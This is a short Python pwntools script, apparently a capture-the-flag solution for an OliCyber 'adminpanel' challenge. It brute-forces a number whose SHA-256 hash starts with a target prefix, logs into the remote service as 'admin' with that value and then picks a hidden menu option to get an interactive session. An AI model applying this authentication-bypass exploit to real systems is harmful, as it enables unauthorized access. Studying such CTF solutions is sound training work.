from pwn import remote
from hashlib import sha256

TARGET = "bed100"

chars = ""

i = 0   
while True:
    i += 1
    if i%255 == 0 or i % 255 == 10:
        continue

  
    hash_try = sha256(str(i).encode()).hexdigest()
    # print(hash_try)
    if hash_try.startswith(TARGET):
        print(f"Found matching string: {i}")
        cracked_pass = str(i)

        break

    

p = remote('adminpanel.challs.olicyber.it', 12200)

p.recvuntil(b'Esci\n')
p.sendline(b'1')
p.sendlineafter(b'Username: ', b'admin')
p.sendlineafter(b'Password: ', cracked_pass.encode())
p.sendlineafter(b'Esci\n',b'53')

p.interactive()